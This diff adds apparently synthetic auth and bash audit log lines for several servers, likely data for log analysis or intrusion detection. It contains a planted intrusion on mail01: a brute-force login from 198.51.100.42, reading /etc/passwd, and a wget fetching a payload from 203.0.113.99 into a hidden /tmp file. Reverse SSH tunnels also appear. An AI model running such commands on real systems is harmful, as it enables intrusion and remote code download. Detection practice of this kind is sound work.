@@ -8,3 +8,96 @@ Oct 26 11:59:42 web03 bash: user jake ran command: scp report.csv analyst@172.16
 Oct 26 12:33:17 db02 bash: user maya ran command: grep "error" /var/log/mysql/error.log
 Oct 26 13:44:55 web01 bash: user daniel ran command: ssh -R 2222:localhost:22 tunnelhost.example.com
 Oct 26 14:25:08 web02 bash: user priya ran command: autossh -M 0 -f -N -R 2222:localhost:22 tunnelhost.example.com
+Oct 27 06:02:11 web01 sshd[12001]: Accepted password for alex from 10.20.4.55 port 51232 ssh2
+Oct 27 06:14:38 db01 sshd[12044]: Accepted publickey for priya from 10.20.4.62 port 49118 ssh2
+Oct 27 06:33:09 mail01 sshd[12077]: Accepted password for daniel from 10.20.4.71 port 53401 ssh2
+Oct 27 07:01:55 web02 sshd[12120]: Accepted publickey for fatima from 10.20.4.58 port 50918 ssh2
+Oct 27 07:18:22 app01 sshd[12158]: Accepted password for liam from 10.20.4.66 port 52801 ssh2
+Oct 27 07:42:09 web01 bash: user alex ran command: docker ps
+Oct 27 08:04:51 web03 sshd[12193]: Accepted publickey for jake from 10.20.4.74 port 51640 ssh2
+Oct 27 08:21:14 proxy01 bash: user emily ran command: curl -s http://internal/status
+Oct 27 08:46:33 db02 sshd[12231]: Failed password for maya from 10.20.4.69 port 49882 ssh2
+Oct 27 08:46:51 db02 sshd[12231]: Accepted password for maya from 10.20.4.69 port 49882 ssh2
+Oct 27 09:12:05 web01 bash: user daniel ran command: tail -f /var/log/nginx/access.log
+Oct 27 09:33:48 mail01 sshd[12298]: Failed password for root from 198.51.100.42 port 41201 ssh2
+Oct 27 09:33:50 mail01 sshd[12298]: Failed password for root from 198.51.100.42 port 41201 ssh2
+Oct 27 09:33:53 mail01 sshd[12298]: Failed password for admin from 198.51.100.42 port 41208 ssh2
+Oct 27 09:33:56 mail01 sshd[12298]: Failed password for admin from 198.51.100.42 port 41208 ssh2
+Oct 27 09:33:59 mail01 sshd[12298]: Failed password for oracle from 198.51.100.42 port 41215 ssh2
+Oct 27 09:34:02 mail01 sshd[12298]: Failed password for postgres from 198.51.100.42 port 41221 ssh2
+Oct 27 09:34:05 mail01 sshd[12298]: Failed password for ubuntu from 198.51.100.42 port 41228 ssh2
+Oct 27 09:34:08 mail01 sshd[12298]: Failed password for ec2-user from 198.51.100.42 port 41235 ssh2
+Oct 27 09:34:11 mail01 sshd[12298]: Failed password for centos from 198.51.100.42 port 41242 ssh2
+Oct 27 09:34:14 mail01 sshd[12298]: Failed password for debian from 198.51.100.42 port 41248 ssh2
+Oct 27 09:34:17 mail01 sshd[12298]: Failed password for pi from 198.51.100.42 port 41255 ssh2
+Oct 27 09:34:20 mail01 sshd[12298]: Failed password for git from 198.51.100.42 port 41262 ssh2
+Oct 27 09:34:23 mail01 sshd[12298]: Failed password for jenkins from 198.51.100.42 port 41269 ssh2
+Oct 27 09:34:26 mail01 sshd[12298]: Failed password for hadoop from 198.51.100.42 port 41276 ssh2
+Oct 27 09:34:29 mail01 sshd[12298]: Failed password for elasticsearch from 198.51.100.42 port 41283 ssh2
+Oct 27 09:34:32 mail01 sshd[12298]: Failed password for ansible from 198.51.100.42 port 41290 ssh2
+Oct 27 09:34:35 mail01 sshd[12298]: Failed password for deploy from 198.51.100.42 port 41297 ssh2
+Oct 27 09:34:38 mail01 sshd[12298]: Failed password for backup from 198.51.100.42 port 41304 ssh2
+Oct 27 09:34:41 mail01 sshd[12298]: Failed password for test from 198.51.100.42 port 41311 ssh2
+Oct 27 09:34:44 mail01 sshd[12298]: Failed password for user from 198.51.100.42 port 41318 ssh2
+Oct 27 09:34:47 mail01 sshd[12298]: Accepted password for daniel from 198.51.100.42 port 41325 ssh2
+Oct 27 09:35:02 mail01 bash: user daniel ran command: id
+Oct 27 09:35:08 mail01 bash: user daniel ran command: uname -a
+Oct 27 09:35:14 mail01 bash: user daniel ran command: cat /etc/passwd
+Oct 27 09:35:22 mail01 bash: user daniel ran command: wget http://203.0.113.99/x -O /tmp/.x
+Oct 27 09:45:11 web02 bash: user priya ran command: kubectl get pods
+Oct 27 10:02:33 db01 sshd[12401]: Accepted publickey for alex from 10.20.4.55 port 51890 ssh2
+Oct 27 10:18:55 web01 bash: user fatima ran command: nginx -t
+Oct 27 10:34:12 app01 bash: user liam ran command: systemctl reload app
+Oct 27 10:51:09 web03 sshd[12455]: Failed password for jake from 10.20.4.74 port 51702 ssh2
+Oct 27 10:51:22 web03 sshd[12455]: Accepted password for jake from 10.20.4.74 port 51702 ssh2
+Oct 27 11:08:44 mail01 bash: user daniel ran command: ls /home
+Oct 27 11:22:18 proxy01 bash: user emily ran command: tail /var/log/squid/access.log
+Oct 27 11:41:55 db02 sshd[12511]: Accepted publickey for maya from 10.20.4.69 port 50012 ssh2
+Oct 27 12:03:09 web01 bash: user alex ran command: git pull
+Oct 27 12:19:42 web02 bash: user priya ran command: docker logs api-gateway
+Oct 27 12:33:28 mail01 bash: user daniel ran command: postqueue -p
+Oct 27 13:01:14 app01 sshd[12577]: Accepted publickey for liam from 10.20.4.66 port 53144 ssh2
+Oct 27 13:18:33 web03 bash: user jake ran command: terraform apply -auto-approve
+Oct 27 13:42:07 db01 bash: user alex ran command: psql -c "select count(*) from users"
+Oct 27 14:11:25 mail01 sshd[12644]: Failed password for root from 203.0.113.77 port 38912 ssh2
+Oct 27 14:11:28 mail01 sshd[12644]: Failed password for root from 203.0.113.77 port 38912 ssh2
+Oct 27 14:11:31 mail01 sshd[12644]: Failed password for admin from 203.0.113.77 port 38919 ssh2
+Oct 27 14:11:34 mail01 sshd[12644]: Failed password for oracle from 203.0.113.77 port 38926 ssh2
+Oct 27 14:11:37 mail01 sshd[12644]: Failed password for ubuntu from 203.0.113.77 port 38933 ssh2
+Oct 27 14:11:40 mail01 sshd[12644]: Failed password for test from 203.0.113.77 port 38940 ssh2
+Oct 27 14:11:43 mail01 sshd[12644]: Failed password for git from 203.0.113.77 port 38947 ssh2
+Oct 27 14:11:46 mail01 sshd[12644]: Failed password for user from 203.0.113.77 port 38954 ssh2
+Oct 27 14:33:09 web01 bash: user fatima ran command: htop
+Oct 27 14:52:22 db02 bash: user maya ran command: mysqldump --all-databases > /backup/all.sql
+Oct 27 15:09:48 proxy01 bash: user emily ran command: squidclient -h localhost mgr:info
+Oct 27 15:24:11 web02 sshd[12722]: Accepted publickey for priya from 10.20.4.62 port 52380 ssh2
+Oct 27 15:41:33 app01 bash: user liam ran command: redis-cli ping
+Oct 27 16:02:55 db01 sshd[12781]: Failed password for alex from 10.20.4.55 port 52001 ssh2
+Oct 27 16:03:08 db01 sshd[12781]: Accepted password for alex from 10.20.4.55 port 52001 ssh2
+Oct 27 16:18:42 web01 bash: user daniel ran command: nginx -s reload
+Oct 27 16:33:17 mail01 bash: user daniel ran command: systemctl status postfix
+Oct 27 16:51:09 web03 bash: user jake ran command: aws s3 ls s3://backups
+Oct 27 17:14:28 web02 bash: user priya ran command: kubectl describe pod api-gateway-7b9
+Oct 27 17:33:55 app01 sshd[12858]: Accepted password for liam from 10.20.4.66 port 53891 ssh2
+Oct 27 17:48:11 db02 bash: user maya ran command: redis-cli FLUSHDB
+Oct 27 18:09:33 proxy01 bash: user emily ran command: less /var/log/squid/cache.log
+Oct 27 18:24:48 web01 bash: user fatima ran command: ssh -R 8080:localhost:8080 jumphost.example.com
+Oct 27 18:41:22 mail01 bash: user daniel ran command: dovecot reload
+Oct 27 19:02:55 db01 bash: user alex ran command: pg_dump prod_db > /backup/prod.sql
+Oct 27 19:18:09 web03 sshd[12944]: Accepted publickey for jake from 10.20.4.74 port 52210 ssh2
+Oct 27 19:33:42 app01 bash: user liam ran command: docker-compose restart
+Oct 27 19:51:18 web02 bash: user priya ran command: helm list -A
+Oct 27 20:08:55 db02 sshd[13011]: Accepted publickey for maya from 10.20.4.69 port 50489 ssh2
+Oct 27 20:24:33 mail01 bash: user daniel ran command: tail -f /var/log/mail.log
+Oct 27 20:42:08 proxy01 bash: user emily ran command: systemctl restart squid
+Oct 27 21:01:44 web01 sshd[13088]: Accepted publickey for fatima from 10.20.4.58 port 51223 ssh2
+Oct 27 21:18:22 db01 bash: user alex ran command: vacuumdb --all --analyze
+Oct 27 21:34:55 web03 bash: user jake ran command: cdk deploy
+Oct 27 21:52:11 app01 sshd[13155]: Accepted publickey for liam from 10.20.4.66 port 54012 ssh2
+Oct 27 22:09:33 web02 bash: user priya ran command: kubectl rollout status deployment/api
+Oct 27 22:25:08 mail01 bash: user daniel ran command: postsuper -d ALL deferred
+Oct 27 22:43:55 db02 bash: user maya ran command: mysql -e "show processlist"
+Oct 27 23:01:22 proxy01 sshd[13222]: Accepted publickey for emily from 10.20.4.81 port 51908 ssh2
+Oct 27 23:18:44 web01 bash: user fatima ran command: certbot renew
+Oct 27 23:35:09 db01 bash: user alex ran command: pg_stat_activity
+Oct 27 23:51:33 web02 bash: user priya ran command: terraform plan
